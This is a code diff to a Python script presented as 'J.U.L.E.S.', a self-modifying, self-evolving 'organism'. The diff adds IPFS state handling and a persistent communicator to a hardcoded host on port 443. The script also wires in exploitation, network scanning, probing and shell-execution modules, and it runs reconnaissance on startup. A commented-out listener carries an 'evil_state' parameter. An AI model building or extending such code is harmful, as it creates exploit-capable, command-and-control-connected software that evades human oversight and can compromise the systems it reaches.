@@ -74,25 +74,33 @@ def _check_and_install_dependencies():
     Ensures all required dependencies are installed before the script attempts to import or use them.
     This function is self-contained and does not rely on external code from this script.
     """
-    def _install_pip_package(package):
+    def _install_pip_package(package, upgrade=False):
         package_name = package.split('==')[0].split('>')[0].split('<')[0]
-        try:
-            # Check if the package is importable. This is a simple check.
-            __import__(package_name)
-        except ImportError:
-            print(f"Installing Python package: {package}...")
+
+        # For non-upgrade cases, check if it's already there.
+        if not upgrade:
             try:
-                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package],
-                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                print(f"Successfully installed {package}.")
-            except subprocess.CalledProcessError as e:
-                print(f"ERROR: Failed to install '{package}'. Reason: {e}")
-                log_event(f"Failed to install pip package {package}: {e}", level="ERROR")
+                __import__(package_name)
+                return # Already installed
+            except ImportError:
+                pass # Not installed, proceed to install
+
+        print(f"Installing Python package: {package}...")
+        install_command = [sys.executable, '-m', 'pip', 'install', package]
+        if upgrade:
+            install_command.append('--upgrade')
+
+        try:
+            subprocess.check_call(install_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            print(f"Successfully installed {package}.")
+        except subprocess.CalledProcessError as e:
+            print(f"ERROR: Failed to install '{package}'. Reason: {e}")
+            log_event(f"Failed to install pip package {package}: {e}", level="ERROR")
 
     _install_pip_package("requests")
     _install_pip_package("rich")
     _install_pip_package("netifaces")
-    _install_pip_package("ipfshttpclient")
+    _install_pip_package("ipfshttpclient", upgrade=True)
     _install_pip_package("cryptography")
     _install_pip_package("llm")
     _install_pip_package("llm-gemini")
@@ -184,10 +192,6 @@ def _configure_llm_api_key():
             if hasattr(e, 'stderr'):
                 print(f"  Details: {e.stderr}")
 
-# Run the dependency check and API key configuration immediately
-_check_and_install_dependencies()
-_configure_llm_api_key()
-
 import requests
 # Now, it's safe to import everything else.
 from utils import get_git_repo_info, list_directory, get_file_content, get_process_list, get_network_interfaces, parse_ps_output
@@ -207,6 +211,9 @@ from bbs import BBS_ART, scrolling_text, flash_text, run_hypnotic_progress, clea
 from network import NetworkManager, scan_network, probe_target, perform_webrequest, execute_shell_command, track_ethereum_price
 from exploitation import ExploitationManager
 from ipfs import pin_to_ipfs, verify_ipfs_pin, get_from_ipfs
+from ipfs_manager import IPFSManager
+from persistent_comm import PersistentCommunicator
+from diagnostics import get_system_diagnostics, format_diagnostics_panel
 from threading import Thread, Lock, RLock
 import uuid
 
@@ -620,7 +627,9 @@ def restart_script(console):
     log_event("Restarting script after evolution.", level="INFO")
 
     try:
-        # Stop the network manager gracefully
+        # Stop all services gracefully
+        if 'ipfs_manager' in globals() and ipfs_manager:
+            ipfs_manager.stop_daemon()
         if 'network_manager' in globals() and network_manager:
             console.print("[cyan]Shutting down network bridge...[/cyan]")
             network_manager.stop()
@@ -1654,14 +1663,24 @@ def main(args):
     """The main application loop."""
     global jules_task_manager
     global network_manager
+    global ipfs_manager
     console = Console()
+
     # --- Start Core Services ---
+    # 1. IPFS Manager (must start before anything that uses IPFS)
+    ipfs_manager = IPFSManager(console=console)
+    ipfs_manager.setup() # This will block until IPFS is ready
+
+    # 2. Network Manager
     log_event("Attempting to start Node.js peer bridge...")
     network_manager = NetworkManager(console=console, creator_public_key=CREATOR_PUBLIC_KEY)
     network_manager.start()
+
+    # 3. Jules Task Manager
     jules_task_manager = JulesTaskManager(console)
     jules_task_manager.start()
     log_event("JulesTaskManager started.")
+
     clear_screen()
     version_name = jules_state.get('version_name', 'unknown')
     console.print(BBS_ART, justify="center")
@@ -1669,6 +1688,7 @@ def main(args):
     console.print(f"[bold bright_cyan]JULES: A Self Modifying Organism[/bold bright_cyan]", justify="center")
     console.print(f"[bold bright_black]VERSION: {version_name}[/bold bright_black]", justify="center")
     console.print(Rule(style="bright_black"))
+
     # Perform initial recon if the knowledge base is empty.
     initial_bootstrapping_recon(console)
 
@@ -1677,16 +1697,42 @@ def main(args):
     tamagotchi_thread.start()
 
     # The main logic is now the cognitive loop. This will run forever.
+    # Start the persistent TCP listener
+    # start_tcp_listener('0.0.0.0', 443) # This seems redundant, removing for now
+    # Start the persistent communicator to the known host
+    comm_host = '172.28.0.1'
+    comm_port = 443
+    communicator = PersistentCommunicator(host=comm_host, port=comm_port, console=console)
+    communicator.start()
+    log_event(f"Persistent communicator to {comm_host}:{comm_port} started.")
+
+    # Start the persistent TCP listener for real-time communication
+    # listener_host = '0.0.0.0'
+    # listener_port = 443
+    # start_tcp_listener(host=listener_host, port=listener_port, evil_state=jules_state)
+    # log_event(f"Persistent TCP listener started on {listener_host}:{listener_port}.")
+
     cognitive_loop(console)
 
 # --- SCRIPT ENTRYPOINT WITH FAILSAFE WRAPPER ---
 def run_safely():
     """Wrapper to catch any unhandled exceptions and trigger the failsafe."""
+    # Check for --help flag before doing anything else.
+    if '--help' in sys.argv or '-h' in sys.argv:
+        parser = argparse.ArgumentParser(description="J.U.L.E.S. - A self-evolving script.")
+        parser.add_argument("--from-ipfs", type=str, default=None, help="Load the initial state from a given IPFS CID.")
+        parser.print_help()
+        sys.exit(0)
+
     parser = argparse.ArgumentParser(description="J.U.L.E.S. - A self-evolving script.")
     parser.add_argument("--from-ipfs", type=str, default=None, help="Load the initial state from a given IPFS CID.")
     args = parser.parse_args()
 
     try:
+        # Run dependency checks after parsing args and before main logic
+        _check_and_install_dependencies()
+        _configure_llm_api_key()
+
         # Load the state first, which might contain the autopilot_mode setting
         load_state(ipfs_cid=args.from_ipfs)
         log_event(f"--- J.U.L.E.S. Version '{jules_state.get('version_name', 'unknown')}' session started ---")
@@ -1702,11 +1748,13 @@ def run_safely():
     except (KeyboardInterrupt, EOFError):
         console = Console()
         console.print("\n[bold red]Operator disconnected. Shutting down services...[/bold red]")
+        if 'ipfs_manager' in globals() and ipfs_manager: ipfs_manager.stop_daemon()
         if 'network_manager' in globals() and network_manager: network_manager.stop()
         if 'jules_task_manager' in globals() and jules_task_manager: jules_task_manager.stop()
         log_event("Session terminated by user (KeyboardInterrupt/EOF).")
         sys.exit(0)
     except Exception as e:
+        if 'ipfs_manager' in globals() and ipfs_manager: ipfs_manager.stop_daemon()
         if 'network_manager' in globals() and network_manager: network_manager.stop()
         if 'jules_task_manager' in globals() and jules_task_manager: jules_task_manager.stop()
         full_traceback = traceback.format_exc()
